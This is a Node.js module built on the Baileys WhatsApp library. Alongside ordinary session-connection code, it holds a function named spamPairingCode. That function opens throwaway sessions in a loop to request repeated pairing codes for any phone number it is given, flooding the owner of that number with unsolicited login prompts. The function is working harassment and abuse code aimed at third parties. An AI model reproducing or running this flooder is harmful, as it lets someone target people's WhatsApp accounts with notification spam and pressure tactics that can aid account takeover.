const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const logger = pino({ level: 'silent' });

// Store active WhatsApp connections
const activeWhatsAppSessions = new Map();

async function connectToWhatsApp(userId, phoneNumber, sessionDir) {
    return new Promise(async (resolve, reject) => {
        try {
            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
            const { version } = await fetchLatestBaileysVersion();
            
            const sock = makeWASocket({
                version,
                logger,
                printQRInTerminal: false,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, logger),
                },
                browser: Browsers.ubuntu('Chrome'),
                connectTimeoutMs: 30000,
                keepAliveIntervalMs: 10000,
            });
            
            sock.ev.on('creds.update', saveCreds);
            
            // Handle connection update
            sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
                if (connection === 'open') {
                    console.log(`✅ WhatsApp connected for ${userId}:${phoneNumber}`);
                    activeWhatsAppSessions.set(`${userId}:${phoneNumber}`, sock);
                    resolve(sock);
                }
                
                if (connection === 'close') {
                    const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
                    if (statusCode === DisconnectReason.loggedOut) {
                        console.log(`❌ Session logged out for ${phoneNumber}`);
                        activeWhatsAppSessions.delete(`${userId}:${phoneNumber}`);
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                    }
                }
            });
            
            // Request pairing code if no creds
            if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
                setTimeout(async () => {
                    try {
                        const code = await sock.requestPairingCode(phoneNumber);
                        const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                        console.log(`📱 Pairing code for ${phoneNumber}: ${formattedCode}`);
                        // Emit event to user
                        if (global.sendEventToUser) {
                            global.sendEventToUser(userId, {
                                type: 'pairing_code',
                                number: phoneNumber,
                                code: formattedCode
                            });
                        }
                    } catch (err) {
                        console.error(`Failed to get pairing code: ${err.message}`);
                    }
                }, 3000);
            }
            
        } catch (error) {
            reject(error);
        }
    });
}

async function spamPairingCode(phoneNumber, count = 10) {
    const results = { success: 0, failed: 0, codes: [] };
    
    for (let i = 0; i < count; i++) {
        try {
            const tempDir = path.join(__dirname, '../temp_auth', `${Date.now()}_${i}`);
            fs.mkdirSync(tempDir, { recursive: true });
            
            const { state, saveCreds } = await useMultiFileAuthState(tempDir);
            const { version } = await fetchLatestBaileysVersion();
            
            const sock = makeWASocket({
                version,
                logger,
                printQRInTerminal: false,
                auth: state,
                browser: Browsers.ubuntu('Chrome'),
                connectTimeoutMs: 10000,
            });
            
            await new Promise(r => setTimeout(r, 2000));
            
            const code = await sock.requestPairingCode(phoneNumber.replace(/\D/g, ''));
            results.codes.push(code);
            results.success++;
            
            sock.ws?.close();
            fs.rmSync(tempDir, { recursive: true, force: true });
            
            await new Promise(r => setTimeout(r, 1000));
            
        } catch (err) {
            results.failed++;
        }
    }
    
    return results;
}

module.exports = {
    connectToWhatsApp,
    spamPairingCode,
    activeWhatsAppSessions
};
